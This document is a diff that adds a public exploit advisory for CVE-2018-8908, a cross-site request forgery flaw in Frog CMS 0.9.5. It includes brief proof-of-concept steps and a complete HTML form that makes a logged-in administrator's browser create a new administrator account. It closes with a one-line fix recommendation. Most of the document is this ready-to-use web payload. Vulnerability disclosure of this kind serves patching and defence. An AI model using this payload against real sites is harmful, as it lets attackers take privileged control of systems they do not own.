@@ -1,0 +1,58 @@
+# Exploit Title:​​ Cross Site Request Forgery- Frog CMS
+# Date: 31-03-2018
+# Exploit Author: Samrat Das
+# Contact: http://twitter.com/Samrat_Das93
+# Website: https://securitywarrior9.blogspot.in/
+# Vendor Homepage: https://github.com/philippe/FrogCMS
+# Version: 0.9.5
+# CVE :  CVE-2018-8908
+# Category: Webapp CMS
+
+
+1. Description
+
+The application source code is coded in a way which allows malicious HTML
+request to be executed without veryifying source of request.This leads to
+arbitary execution with malicous request which will lead to the creation of
+a privileged user.
+
+2. Proof of Concept
+
+      Visit the application
+      Visit the Add Users Page.
+      Craft an html page with all the details for an admin user creation
+and host it on a server
+      Upon the link being clicked by a logged in admin user, immidiately,
+another admin user will get created.
+
+Exploit Code:
+
+<html>
+  <body>
+    <form action="http://localhost/frog/admin/?/user/add" method="POST">
+      <input type="hidden" name="user&#91;name&#93;" value="Test&#95;1" />
+      <input type="hidden" name="user&#91;email&#93;" value="" />
+      <input type="hidden" name="user&#91;username&#93;" value="test" />
+      <input type="hidden" name="user&#91;password&#93;" value="test" />
+      <input type="hidden" name="user&#91;confirm&#93;" value="test" />
+      <input type="hidden"
+name="user&#95;permission&#91;administrator&#93;" value="1" />
+      <input type="hidden" name="commit" value="Save" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+
+
+3. Solution:
+
+Solution - Fix & Patch: The application code should be configured to
+implement anti csrf token to filter malicous HTTP Requests.
+
+
+4. Public Reference with POC and steps:
+
+http://securitywarrior9.blogspot.in/2018/03/cross-site-request-forgery-frog-cms-cve.html
+
+Thanks and Regards
+Samrat
